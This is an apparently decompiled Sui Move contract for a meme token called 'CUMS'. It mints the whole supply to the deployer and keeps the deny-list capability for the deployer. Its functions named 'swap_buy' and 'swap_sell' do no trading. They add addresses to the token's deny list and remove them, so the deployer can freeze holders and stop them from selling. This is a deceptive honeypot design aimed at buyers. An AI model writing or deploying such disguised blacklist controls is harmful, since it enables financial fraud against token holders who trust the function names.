module 0xca0d426d32358f19a5ea9afcfe794e3ebeb411759a748dd420e1d6896e7f2ac9::cums {
    struct CUMS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CUMS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CUMS>(arg0, 9, b"CUMS", b"alpha humans", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmeAfvY5k9kbmRawENhA4Qx1EmcRRwyG81uxiFcKDJ8tfM"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CUMS>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CUMS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CUMS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CUMS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CUMS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CUMS>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CUMS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CUMS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

